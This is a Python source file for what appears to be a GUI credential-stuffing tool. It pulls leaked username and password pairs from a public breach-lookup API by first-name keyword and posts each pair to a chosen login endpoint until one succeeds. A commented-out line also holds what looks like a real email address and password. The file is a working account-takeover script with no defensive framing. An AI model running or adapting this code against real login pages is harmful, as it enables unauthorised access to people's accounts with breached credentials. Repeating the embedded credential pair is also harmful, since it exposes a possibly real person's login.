import requests
from kivy.clock import Clock

from gui.dictionary_attacks.console_view import ConsoleView


class Credentials:
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def __str__(self):
        return f"Username: {self.username}, Password: {self.password}"


global_credentials_list = [
    # Credentials("pppbbb616000@gmail.com", "jRez.LZ4J9E!3Du")
]
keywords = [
    "Liam", "Emma", "Noah", "Ava", "Oliver", "Isabella", "Elijah", "Sophia", "James",
    "Amelia", "Benjamin", "Mia", "William", "Charlotte", "Lucas", "Evelyn", "Henry", "Abigail", "Alexander",
    # "Harper", "Jack", "Ella", "Daniel", "Scarlett", "Matthew", "Aria", "Samuel", "Grace", "Jackson",
    # "Lily", "Sebastian", "Chloe", "Gabriel", "Ella", "Carter", "Nora", "Michael", "Zoey", "Wyatt",
    # "Isla", "John", "Layla", "Luke", "Mila", "Isaac", "Lucy", "Joshua", "Riley", "Andrew", "Sadie",
    # "Nathan", "Ruby", "Christopher", "Stella", "Joseph", "Victoria", "David", "Alice", "Aiden", "Maya",
    # "Anthony", "Penelope", "Eli", "Savannah", "Matthew", "Lily", "Dylan", "Audrey", "Caleb", "Zoey",
    # "Asher", "Bella", "Levi", "Luna", "Thomas", "Eleanor", "Hunter", "Scarlett", "Aaron", "Hazel",
    # "Julian", "Audrey", "Adam", "Mila", "Ryan", "Ellie", "Connor", "Nova", "Owen", "Lily", "Carson",
    # "Chloe", "Jaxon", "Emilia", "Mason", "Arlo", "Madeline", "Kai", "Brooklyn"
]


def set_credentials(query, limit=10):
    print(f"Fetching credentials for query '{query}'")
    url = f"https://api.proxynova.com/comb?query={query}&limit={limit}"

    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        count = str(len(data["lines"]))
        print(f"Found {count} entries for query {query}")

        if len(data["lines"]) > 0:
            for line in data["lines"]:
                try:
                    parts = line.split(":")
                    global_credentials_list.append(Credentials(parts[0], parts[1]))
                except IndexError as e:
                    try:
                        parts = line.split(";")
                        global_credentials_list.append(Credentials(parts[0], parts[1]))
                    except IndexError as e:
                        pass

        else:
            print(f"Could not find any credentials for query {query}")
    else:
        print(f"Error: {response.status_code}")


class Output:
    def __init__(self, success, message):
        self.success = success
        self.message = message

    def __str__(self):
        return f"Success: {self.success}, Message: {self.message}"


def dictionary_attack(username_var, password_var, login_success_var, url, headers, console_view: ConsoleView):
    output = Output(False, "")

    if len(global_credentials_list) > 0:
        for i in range(len(global_credentials_list) - 1, -1, -1):
            output = Output(False, "")

            try:
                credentials = global_credentials_list[i]
                trying = f"Trying password: {credentials.password} and {username_var}: {credentials.username}"
                output.message = output.message + trying

                payload = {
                    username_var: credentials.username,
                    password_var: credentials.password
                }

                response = requests.post(url, json=payload, headers=headers)

                if login_success_var in response.text or response.status_code == 200:
                    success_msg = f"\n[SUCCESS] Password found: {credentials.password}"
                    output.message = output.message + success_msg
                    output.success = True

                else:
                    failed_msg = f"\n[FAILED] Password incorrect"
                    output.message = output.message + failed_msg
                    global_credentials_list.remove(credentials)
                    print(output.message)

            except Exception as e:
                error_msg = f"\nError: {e}"
                output.message = output.message + error_msg

            print(output.message)
            Clock.schedule_once(lambda dt: console_view.add_text(output.message))

    return output

# if __name__ == "__main__":
# success = False
# for keyword in keywords:
#     set_credentials(keyword)
#     success = dictionary_attack(username_variable, password_variable, login_success_variable, url_global, headers_global)
#     if success: break
# print("Dictionary Attack Complete")
